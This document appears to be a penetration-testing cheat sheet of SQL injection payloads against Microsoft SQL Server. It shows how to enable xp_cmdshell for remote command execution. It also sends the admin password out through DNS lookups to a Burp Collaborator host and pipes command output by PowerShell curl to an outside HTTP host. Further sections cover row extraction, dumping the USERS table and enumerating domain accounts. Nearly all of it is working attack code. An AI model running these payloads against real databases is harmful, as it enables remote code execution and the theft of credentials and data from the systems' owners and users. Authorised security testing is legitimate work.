---
description: Advanced MSSQL Injection Exploitation
---

# MSSQL

#### MSSQL RCE:

{% code overflow="wrap" %}
```bash
#Check if xp_cmdshell is enabled. Else, enable it. This can output some errors, but the file should be created
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute commands:
EXEC master..xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig'; //without master.. still works.
```
{% endcode %}

#### MSSQL OOB via DNS lookup

{% code overflow="wrap" %}
```sql
'; exec master..xp_dirtree "//xxxx.burpcollaborator.net/a"-- -

'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='admin');exec('master..xp_dirtree "//'+@p+'.xxx.burpcollaborator.net/a"')--
```
{% endcode %}

#### MSSQL OOB RCE via HTTP

{% code overflow="wrap" %}
```bash
#Enable xp_cmdshell
; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

#Execute command
;EXEC xp_cmdshell 'powershell -c "$x = whoami; curl http://xxx/get?output=$x"';--
```
{% endcode %}

#### MSSQL get the Nth row

We can use the following query to get the _N_th row, like LIMIT 9,1 in mysql.

{% code overflow="wrap" %}
```bash
#Select 9th row (like LIMIT 9,1)
select top 1 table_name from (select top 9 table_name from information_schema.tables order by table_name ASC) sq order by table_name DESC
```
{% endcode %}

#### MSSQL concatenate output into a single row

```bash
#http://www.kachakil.com/papers/SFX-SQLi-Paper-en.pdf
#Outputs the first 10 rows of the table USERS in XML format (single row):
SELECT top 10 * from USERS for xml raw; #Raw XML
SELECT top 10 * from USERS for xml raw, binary base64; #Base64 encoded
```

#### MSSQL Enumerate domain users

It may be possible to enumerate domain users via SQL injection inside a MSSQL **** server using the following MSSQL functions:

<pre class="language-bash"><code class="lang-bash"><strong>#Get the domain name:
</strong>SELECT DEFAULT_DOMAIN();
</code></pre>

{% code overflow="wrap" %}
```bash
#Enumerate the existence of the user "DOMAIN\Administrator":
#This function will return the SID of the user (hence we know it is valid): 
master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))

#Example output of a valid user:
0x01050000000....8c08427fef4010000
```
{% endcode %}
